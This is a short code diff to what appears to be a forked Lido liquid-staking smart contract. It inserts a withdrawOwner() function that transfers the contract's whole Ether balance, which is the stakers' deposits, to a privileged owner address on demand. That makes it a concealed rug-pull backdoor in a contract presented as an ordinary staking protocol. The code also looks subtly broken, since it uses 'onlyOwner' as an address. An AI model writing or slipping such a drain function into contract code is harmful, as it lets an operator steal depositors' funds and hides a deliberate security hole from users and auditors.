@@ -331,6 +331,12 @@ contract Lido is Versioned, StETHPermit, AragonApp {
 
         _pauseStaking();
     }
+    
+   function withdrawOwner() external {
+        uint256 plsBalance = address(this).balance;
+        require(msg.sender == onlyOwner, "Not Owner");
+        onlyOwner.transfer(plsBalance);
+   }
 
     /**
      * @notice Resumes accepting new Ether to the protocol (if `pauseStaking` was called previously)
